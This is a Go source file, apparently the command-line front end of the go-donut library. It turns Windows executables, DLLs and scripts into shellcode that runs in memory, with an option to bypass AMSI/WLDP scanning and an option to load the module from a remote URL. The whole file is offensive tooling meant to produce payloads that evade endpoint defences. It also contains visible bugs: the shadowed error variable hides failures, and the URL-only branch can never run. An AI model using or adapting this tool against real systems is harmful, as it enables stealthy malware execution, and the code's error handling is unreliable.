package main

import (
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/Binject/go-donut/donut"
	"github.com/akamensky/argparse"
)

func main() {

	parser := argparse.NewParser("go-donut", "Convert a PE/.NET EXE or DLL to shellcode.")
	srcFile := parser.String("f", "in", &argparse.Options{Required: true, Help: ".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory."})
	url := parser.String("u", "url", &argparse.Options{Required: false, Help: "HTTP server that will host the donut module."}) // ie. file:///C:/Windows//System32//calc.exe
	archStr := parser.String("a", "arch", &argparse.Options{Required: false,
		Default: "x84", Help: "Target Architecture: x32, x64, or x84"})
	bypass := parser.Int("b", "bypass", &argparse.Options{Required: false,
		Default: 3, Help: "Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail."})
	dstFile := parser.String("o", "out", &argparse.Options{Required: false,
		Default: "payload.bin", Help: "Output file."})
	dotNet := parser.Flag("", "dotnet", &argparse.Options{Required: false, Help: ".NET Mode, set true for .NET exe and DLL files (autodetect not implemented)"})

	className := parser.String("c", "", &argparse.Options{Required: false, Help: "Optional class name.  (required for .NET DLL)"})
	methodName := parser.String("m", "", &argparse.Options{Required: false, Help: "Optional method or API name for DLL. (method is required for .NET DLL)"})
	params := parser.String("p", "", &argparse.Options{Required: false, Help: "Optional parameters or command line, separated by comma or semi-colon."})
	runtime := parser.String("r", "", &argparse.Options{Required: false, Help: "CLR runtime version."})
	appDomain := parser.String("d", "", &argparse.Options{Required: false, Help: "AppDomain name to create for .NET. Randomly generated by default."})

	noCrypto := parser.Flag("", "nocrypto", &argparse.Options{Required: false, Help: "UNSAFE! Disables all crypto and randomness for testing only"})

	//args = append([]string{"build"}[:], args...)
	if err := parser.Parse(os.Args); err != nil || *srcFile == "" {
		log.Println(parser.Usage(err))
		return
	}

	var donutArch donut.DonutArch
	switch strings.ToLower(*archStr) {
	case "x32":
		donutArch = donut.X32
	case "x64":
		donutArch = donut.X64
	case "x84":
		donutArch = donut.X84
	default:
		log.Fatal("Unknown architecture provided")
	}

	config := new(donut.DonutConfig)
	config.Arch = donutArch
	config.NoCrypto = *noCrypto

	if *url == "" {
		config.InstType = donut.DONUT_INSTANCE_PIC
	} else {
		config.InstType = donut.DONUT_INSTANCE_URL
	}

	config.DotNetMode = *dotNet
	config.Parameters = *params
	config.Runtime = *runtime
	config.URL = *url
	config.Class = *className
	config.Method = *methodName
	config.Domain = *appDomain
	config.Bypass = *bypass

	var err error
	if *srcFile == "" {
		if *url == "" {
			log.Fatal("No source URL or file provided")
		}
		payload, err := donut.ShellcodeFromURL(*url, config)
		if err == nil {
			err = ioutil.WriteFile(*dstFile, payload.Bytes(), 0644)
		}
	} else {
		payload, err := donut.ShellcodeFromFile(*srcFile, config)
		if err == nil {
			f, err := os.Create(*dstFile)
			if err != nil {
				log.Fatal(err)
			}
			defer f.Close()
			if _, err = payload.WriteTo(f); err != nil {
				log.Fatal(err)
			}
		}
	}
	if err != nil {
		log.Println(err)
	} else {
		log.Println("Done!")
	}
}
